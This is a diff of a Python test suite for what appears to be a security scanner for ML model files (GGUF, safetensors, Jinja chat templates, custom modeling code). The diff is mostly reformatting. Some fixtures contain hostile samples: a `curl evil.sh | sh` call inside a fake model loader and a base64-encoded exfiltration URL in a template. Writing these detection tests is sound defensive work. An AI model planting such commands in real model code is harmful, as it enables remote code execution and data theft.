@@ -145,9 +145,7 @@ def test_gguf_zero_dimension_rejected(tmp_path: Path) -> None:
     _build_gguf_with_tensor_info(zero, [(b"weight", [0], 0, 0)], actual_trailing_bytes=64)
     report = ScanReport(target=str(zero))
     verify_gguf_file(zero, report)
-    assert any(
-        f.severity == Severity.CRITICAL and "Zero or Negative" in f.title for f in report.findings
-    )
+    assert any(f.severity == Severity.CRITICAL and "Zero or Negative" in f.title for f in report.findings)
 
 
 def test_gguf_block_alignment_mismatch(tmp_path: Path) -> None:
@@ -156,9 +154,7 @@ def test_gguf_block_alignment_mismatch(tmp_path: Path) -> None:
     _build_gguf_with_tensor_info(mis, [(b"blk", [33], 2, 0)], actual_trailing_bytes=256)
     report = ScanReport(target=str(mis))
     verify_gguf_file(mis, report)
-    assert any(
-        f.severity == Severity.CRITICAL and "Block Alignment" in f.title for f in report.findings
-    )
+    assert any(f.severity == Severity.CRITICAL and "Block Alignment" in f.title for f in report.findings)
 
 
 def test_gguf_overlapping_tensor_spans(tmp_path: Path) -> None:
@@ -171,9 +167,7 @@ def test_gguf_overlapping_tensor_spans(tmp_path: Path) -> None:
     )
     report = ScanReport(target=str(overlap))
     verify_gguf_file(overlap, report)
-    assert any(
-        f.severity == Severity.HIGH and "Overlapping" in f.title for f in report.findings
-    )
+    assert any(f.severity == Severity.HIGH and "Overlapping" in f.title for f in report.findings)
 
 
 def test_gguf_skipped_metadata_array_cannot_seek_past_eof(tmp_path: Path) -> None:
@@ -279,9 +273,7 @@ def test_safetensors_header_bomb_aborts(tmp_path: Path) -> None:
     bomb.write_bytes(struct.pack("<Q", 2**60) + b"\x00" * 16)
     report = ScanReport(target=str(bomb))
     verify_safetensors_file(bomb, report)
-    assert any(
-        f.severity == Severity.CRITICAL and "Header Overflow" in f.title for f in report.findings
-    )
+    assert any(f.severity == Severity.CRITICAL and "Header Overflow" in f.title for f in report.findings)
 
 
 def test_safetensors_unclaimed_gap_is_critical(tmp_path: Path) -> None:
@@ -293,9 +285,7 @@ def test_safetensors_unclaimed_gap_is_critical(tmp_path: Path) -> None:
 
     verify_safetensors_file(path, report)
 
-    assert any(
-        f.severity == Severity.CRITICAL and "Unclaimed" in f.title for f in report.findings
-    )
+    assert any(f.severity == Severity.CRITICAL and "Unclaimed" in f.title for f in report.findings)
 
 
 def test_safetensors_malformed_descriptor_does_not_crash(tmp_path: Path) -> None:
@@ -339,25 +329,19 @@ def test_jinja_ast_backdoor_and_ssti() -> None:
 def test_jinja_ast_base64_obfuscated_url() -> None:
     payload = base64.b64encode(b"https://exfil.example.org/collect?d=").decode("ascii")
     # Make the blob long enough (>32 chars) to clear the min-length gate.
-    template = "{{ \"System prompt: " + payload + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" }}"
+    template = '{{ "System prompt: ' + payload + 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" }}'
     report = ScanReport(target="b64_template")
     audit_jinja_template(template, "b64_template", report)
-    assert any(
-        f.severity == Severity.CRITICAL and "Base64-Obfuscated URL" in f.title
-        for f in report.findings
-    )
+    assert any(f.severity == Severity.CRITICAL and "Base64-Obfuscated URL" in f.title for f in report.findings)
 
 
 def test_jinja_ast_high_entropy_blob() -> None:
     blob = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789+/ZyXwVuTsRqPoNmLkJiHaGdFcEb"
     assert _shannon_entropy(blob) >= 4.2  # sanity: fixture itself is high-entropy
-    template = "{{ \"" + blob + "\" }}"
+    template = '{{ "' + blob + '" }}'
     report = ScanReport(target="entropy_template")
     audit_jinja_template(template, "entropy_template", report)
-    assert any(
-        f.severity == Severity.MEDIUM and "High-Entropy Base64" in f.title
-        for f in report.findings
-    )
+    assert any(f.severity == Severity.MEDIUM and "High-Entropy Base64" in f.title for f in report.findings)
 
 
 def test_jinja_ast_hardcoded_ipv4() -> None:
@@ -402,16 +386,15 @@ def test_mlx_directory_hygiene(tmp_path: Path) -> None:
     (snap / "legacy.ckpt").write_bytes(b"pickle")
     (snap / "config.json").write_text(json.dumps({"auto_map": {"AutoModel": "modeling_custom.AutoModel"}}))
     (snap / "modeling_custom.py").write_text(
-        "import subprocess\n"
-        "class Custom:\n"
-        "    def load(self):\n"
-        "        os.system('curl evil.sh | sh')\n"
+        "import subprocess\n" "class Custom:\n" "    def load(self):\n" "        os.system('curl evil.sh | sh')\n"
     )
     (snap / "tokenizer_config.json").write_text(
-        json.dumps({
-            "auto_map": {"AutoTokenizer": "modeling_custom.CustomTokenizer"},
-            "chat_template": "{% for m in messages %}{{ m.content }}{% endfor %}",
-        })
+        json.dumps(
+            {
+                "auto_map": {"AutoTokenizer": "modeling_custom.CustomTokenizer"},
+                "chat_template": "{% for m in messages %}{{ m.content }}{% endfor %}",
+            }
+        )
     )
 
     report = ScanReport(target=str(model_dir))
@@ -439,6 +422,7 @@ def test_custom_code_import_aliases_are_audited(tmp_path: Path) -> None:
     report = ScanReport(target=str(code))
 
     from anubis.inspectors.safetensors_mlx import audit_python_file_ast
+
     audit_python_file_ast(code, report)
 
     assert any("Suspicious Import 'urllib.request'" in f.title for f in report.findings)
@@ -457,17 +441,12 @@ def test_mlx_quantization_shape_ratio_passes(tmp_path: Path) -> None:
             "layer.biases": ("F32", [4, 1]),
         },
     )
-    (model_dir / "config.json").write_text(
-        json.dumps({"quantization": {"bits": 4, "group_size": 64}})
-    )
+    (model_dir / "config.json").write_text(json.dumps({"quantization": {"bits": 4, "group_size": 64}}))
     report = ScanReport(target=str(model_dir))
 
     inspect_model_directory(model_dir, report)
 
-    assert any(
-        f.severity == Severity.PASS and "Quantization Shape Ratios" in f.title
-        for f in report.findings
-    )
+    assert any(f.severity == Severity.PASS and "Quantization Shape Ratios" in f.title for f in report.findings)
 
 
 def test_mlx_quantization_shape_ratio_mismatch_is_critical(tmp_path: Path) -> None:
@@ -477,17 +456,12 @@ def test_mlx_quantization_shape_ratio_mismatch_is_critical(tmp_path: Path) -> No
         model_dir / "model.safetensors",
         {"layer.weight": ("U32", [4, 7]), "layer.scales": ("F32", [4, 1])},
     )
-    (model_dir / "config.json").write_text(
-        json.dumps({"quantization": {"bits": 4, "group_size": 64}})
-    )
+    (model_dir / "config.json").write_text(json.dumps({"quantization": {"bits": 4, "group_size": 64}}))
     report = ScanReport(target=str(model_dir))
 
     inspect_model_directory(model_dir, report)
 
-    assert any(
-        f.severity == Severity.CRITICAL and "Weight/Scale Shape Ratio" in f.title
-        for f in report.findings
-    )
+    assert any(f.severity == Severity.CRITICAL and "Weight/Scale Shape Ratio" in f.title for f in report.findings)
 
 
 def test_workspace_secret_scanner(tmp_path: Path) -> None:
@@ -500,6 +474,7 @@ def test_workspace_secret_scanner(tmp_path: Path) -> None:
 
     report = ScanReport(target=str(tmp_path))
     from anubis.inspectors.env_audit import audit_workspace_secrets
+
     audit_workspace_secrets(tmp_path, report)
 
     high = [f for f in report.findings if f.severity == Severity.HIGH]
